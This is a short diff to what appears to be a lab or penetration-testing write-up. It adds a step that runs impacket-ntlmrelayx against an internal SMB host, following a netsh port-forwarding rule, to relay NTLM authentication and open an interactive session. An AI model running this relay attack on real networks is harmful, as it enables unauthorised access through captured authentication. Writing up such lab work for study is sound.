@@ -1732,7 +1732,11 @@ The command must return nothing. At this point I set a portforwarding rule in PC
 
     netsh interface portproxy add v4tov4 listenport=445 listenaddress=10.200.95.35 connectport=445 connectaddress=10.200.95.33
 
+Now on our attacker machine we can lunch the attacker:
 
+    impacket-ntlmrelayx -t smb://10.200.95.30 -smb2support -i
+
+The -i flag will lunch an interactive session once a connection is caugth.
     
 
 
